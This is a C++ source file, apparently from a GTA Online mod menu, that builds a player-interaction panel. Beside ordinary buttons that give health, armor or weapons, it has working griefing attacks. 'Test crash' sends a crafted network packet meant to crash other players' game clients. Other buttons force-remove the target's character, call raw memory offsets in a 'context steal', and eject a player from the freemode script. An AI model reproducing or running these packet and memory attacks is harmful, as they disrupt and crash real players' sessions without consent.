#include "script/globals/GPBD_FM_3.hpp"
#include "services/script_connection/script_connection_service.hpp"
#include "util/scripts.hpp"
#include "util/vehicle.hpp"
#include "views/view.hpp"
#include "packet.hpp"

namespace big
{
	void view::player_misc()
	{
		ImGui::BeginGroup();
		components::sub_title("DEBUG_TAB_MISC"_T);
		if (ImGui::BeginListBox("##misc", get_listbox_dimensions()))
		{
			components::player_command_button<"joinceo">(g_player_service->get_selected());
			ImGui::SameLine();
			components::player_command_button<"enterint">(g_player_service->get_selected());
			components::player_command_button<"copyoutfit">(g_player_service->get_selected());
			ImGui::SameLine();
			components::player_command_button<"copymodel">(g_player_service->get_selected());
			components::player_command_button<"clearwanted">(g_player_service->get_selected());
			ImGui::SameLine();
			components::player_command_button<"givehealth">(g_player_service->get_selected());
			ImGui::SameLine();
			components::player_command_button<"givearmor">(g_player_service->get_selected());
			components::player_command_button<"giveammo">(g_player_service->get_selected());
			ImGui::SameLine();
			components::player_command_button<"giveweaps">(g_player_service->get_selected(), {});

			components::button("Test crash", [] {
				for (auto& player : g_player_service->players())
				{
					if (player.second->id() == self::id || player.second->id() == g_player_service->get_selected()->id())
						continue;

					packet pack;
					pack.write_message(rage::eNetMessage::MsgRoamingInitialBubble);
					pack.write<int>(0, 4);
					pack.write<int>(32, 6);
					pack.write<int>(0, 4);
					pack.write<int>(self::id, 6);
					pack.send(player.second->get_net_game_player()->m_msg_id);
				}
			});

			components::button("Test ciu9rash", [] {
				entity::force_remove_network_entity(g_player_service->get_selected()->get_ped(), false);
			});

			components::button("Test context steal", [] {
				using cxst = void(*)(__int64, CNetGamePlayer*, int*);
				auto x     = (cxst)((__int64)GetModuleHandleA(0) + 0x1161854);
				int arr[]  = {0, g_player_service->get_selected()->id()};
				x((__int64)GetModuleHandleA(0) + 0x29bd880, g_player_service->get_self()->get_net_game_player(), (int*)&arr);
			});

			components::button("Remp", [] {
				if (auto a = gta_util::find_script_thread("freemode"_J))
					reinterpret_cast<CGameScriptHandlerNetComponent*>(a->m_net_component)
					    ->remove_player_from_script(g_player_service->get_selected()->get_net_game_player());
			});

			ImGui::BeginGroup();
			ImGui::Checkbox("OFF_THE_RADAR"_T.data(), &g_player_service->get_selected()->off_radar);
			ImGui::Checkbox("NEVER_WANTED"_T.data(), &g_player_service->get_selected()->never_wanted);
			ImGui::Checkbox("SEMI_GODMODE"_T.data(), &g_player_service->get_selected()->semi_godmode);
			ImGui::EndGroup();

			ImGui::SameLine();

			ImGui::Checkbox("VIEW_NET_SESSION_FIX_VEHICLE"_T.data(), &g_player_service->get_selected()->fix_vehicle);

			ImGui::EndListBox();
		}

		ImGui::EndGroup();
	}
}